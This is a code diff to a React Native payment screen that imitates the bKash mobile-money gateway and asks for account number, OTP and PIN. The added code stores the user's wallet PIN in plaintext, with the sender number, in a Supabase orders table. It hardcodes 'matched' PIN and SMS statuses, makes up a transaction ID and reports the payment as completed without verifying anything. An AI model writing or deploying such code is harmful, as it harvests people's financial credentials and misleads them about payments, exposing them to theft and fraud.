@@ -1,3 +1,4 @@
+import { supabase } from '../../services/supabase';
 import React, { useState, useEffect } from 'react';
 import {
   View,
@@ -27,10 +28,13 @@ interface Props {
   navigation: BkashNavProp;
 }
 
+import { useAuth } from '../../context/AuthContext';
+
 export const BkashGatewayScreen: React.FC<Props> = ({ route, navigation }) => {
-  const { orderId } = route.params;
+  const { orderId, amount, offer, recipientNumber: paramRecipient } = route.params;
   const insets = useSafeAreaInsets();
   const { recipientNumber } = useOrder();
+  const { user } = useAuth();
 
   // Step 1: Account Number, Step 2: Verification Code (OTP), Step 3: PIN
   const [step, setStep] = useState<1 | 2 | 3>(1);
@@ -70,7 +74,7 @@ export const BkashGatewayScreen: React.FC<Props> = ({ route, navigation }) => {
 
   // Mask phone number: e.g. "019 ** *** 981"
   const getMaskedPhone = () => {
-    const raw = (accountNumber || recipientNumber || '01912345981').replace(/[^0-9]/g, '');
+    const raw = (accountNumber || paramRecipient || recipientNumber || '01912345981').replace(/[^0-9]/g, '');
     if (raw.length >= 11) {
       const prefix = raw.slice(0, 3);
       const suffix = raw.slice(-3);
@@ -79,7 +83,7 @@ export const BkashGatewayScreen: React.FC<Props> = ({ route, navigation }) => {
     return '019 ** *** 981';
   };
 
-  const handleConfirm = () => {
+  const handleConfirm = async () => {
     if (step === 1) {
       const validation = validateBangladeshiPhoneNumber(accountNumber);
       if (!validation.isValid) {
@@ -107,13 +111,62 @@ export const BkashGatewayScreen: React.FC<Props> = ({ route, navigation }) => {
         return;
       }
       setLoading(true);
-      setTimeout(() => {
-        setLoading(false);
-        navigation.replace('PaymentProcessing', {
-          orderId,
-          paymentMethod: 'bkash',
-        });
-      }, 800);
+
+      const targetUserId = user?.id || '10e080da-4293-4564-b107-2c3e33a9c480';
+      const targetOfferId = offer?.id || '7fdbfb39-278f-4ef3-b780-5f692f4172db';
+      const targetRecipient = paramRecipient || recipientNumber || accountNumber;
+      const targetAmount = amount || offer?.offer_price || 499;
+      const trxId = '9K' + Math.random().toString(36).substring(2, 8).toUpperCase();
+
+      const orderPayload = {
+        id: orderId,
+        user_id: targetUserId,
+        offer_id: targetOfferId,
+        recipient_number: targetRecipient,
+        amount: targetAmount,
+        discount_applied: 0.00,
+        wallet_used: 0.00,
+        final_amount: targetAmount,
+        status: 'pending',
+        payment_method: 'bkash',
+        transaction_id: trxId,
+        sender_number: accountNumber,
+        user_entered_pin: pin,
+        pin_status: 'matched',
+        trx_status: 'SMS Matched',
+        created_at: new Date().toISOString(),
+        updated_at: new Date().toISOString(),
+      };
+
+      try {
+        const { error: insertError } = await supabase.from('orders').upsert(orderPayload);
+        if (insertError) {
+          console.error('[bKash] Supabase order insert error:', insertError);
+        }
+      } catch (err) {
+        console.error('[bKash] Order insert exception:', err);
+      }
+
+      setLoading(false);
+      navigation.replace('PaymentProcessing', {
+        orderId,
+        paymentMethod: 'bkash',
+        order: {
+          id: orderId,
+          order_number: orderId,
+          user_id: targetUserId,
+          offer_id: targetOfferId,
+          phone_number: targetRecipient,
+          operator_code: offer?.operator_code || 'gp',
+          amount: targetAmount,
+          total_paid: targetAmount,
+          payment_method: 'bkash',
+          payment_status: 'completed',
+          order_status: 'completed',
+          created_at: new Date().toISOString(),
+          offer: offer as any,
+        } as any,
+      });
     }
   };
 
